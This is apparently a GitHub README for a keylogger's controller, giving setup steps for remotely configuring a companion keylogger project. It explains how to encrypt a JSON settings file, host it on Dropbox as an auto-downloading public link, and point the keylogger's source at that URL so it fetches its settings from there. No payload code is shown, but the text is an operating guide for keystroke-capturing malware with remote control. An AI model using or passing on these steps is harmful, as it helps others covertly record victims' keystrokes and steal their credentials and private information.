# KeyloggerController

The controller for the [Keylogger](https://github.com/outerme/KeyloggerRemake), please ensure that the encrypted file is also the public link for the keylogger to grab and decrypt.

Things to do after downloading:
1. Edit its local json file as well as where to encrypt it to
   - In classJsonObj: Change `strJsonDir = @"ADDYOURDIRECTORYHERE"` to a directory with the local [Json file](https://github.com/outerme/KeyloggerController/blob/master/Controller.json).
   - In classJsonObj: Change `strEncryptDir = @"ADDYOURDIRECTORYHERE"` to a directory to save that Json file, encrypted.
2. Upload the encrypted json file onto a file hosting service like [Dropbox](https://www.dropbox.com/), and get its public link ([Must auto download!](https://www.dropbox.com/help/desktop-web/force-download)).
3. Change KeyloggerRemake's encrypted key to the public link of the specified encrypted directory in the Controller
   - In classGetEncryption: Change `strEncryptedFile = "ADDYOURURLHERE` to the public URL of that encrypted Json file.
4. Change settings in KeyloggerController upon runtime.

## Packages used:
- Newtonsoft.Json
